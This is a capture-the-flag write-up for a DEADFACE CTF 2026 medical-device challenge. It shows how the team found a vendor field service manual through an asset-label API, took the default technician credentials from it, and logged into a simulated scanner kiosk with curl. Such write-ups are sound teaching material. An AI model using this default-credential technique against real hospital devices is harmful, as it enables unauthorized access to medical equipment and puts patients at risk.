---
title: Factory Settings
tags:
  - DEADFACE CTF 2026
  - Medical Device
---

# Factory Settings

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | Medical Device |
| **Points** | 25 |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) · Lyna |

## Challenge

The ScanWorks login wants real technician credentials. Hospitals are busy places, and nobody ever changes the defaults the vendor ships with. Find the credentials to log into ScanWorks.

## Solution

### 1. The asset label

The device has an "Asset Label" hotspot. Its API entry links to the vendor manual:

```bash
curl -s http://emedra.dctf.io:8080/api/hotspot/sticker
```

```json
"link": {"href": "/assets/cs9000-field-service-manual.pdf",
         "label": "Emedra CerebraScan CS-9000 — Field Service Manual (PDF)"}
```

The label also gives the serial `EM-CS9K-04417` and site id `stdymphna-rmc-01`.

### 2. The field service manual

Section 2.3, "Default technician account", lists the factory credentials:

```
Username:  emedra-svc
Password:  ChangeMe!2019
IMPORTANT: Change this password on first boot per site security policy
```

### 3. Log in

The hospital never changed them:

```bash
curl -s -X POST http://emedra.dctf.io:8080/api/kiosk/auth \
  -H 'content-type: application/json' \
  -d '{"username":"emedra-svc","password":"ChangeMe!2019"}'
```

```json
{"ok":true,"token":"...","tech":{"name":"Service Technician"},
 "maintenanceToken":"deadface{d3fault_cr3ds_n3v3r_ch4ng3d}"}
```

## Flag

!!! flag "Flag"
    `deadface{d3fault_cr3ds_n3v3r_ch4ng3d}`

## Takeaways

Vendor manuals for medical devices are often public, and they list default service accounts. Look for a manual or support link on the device's own label first.
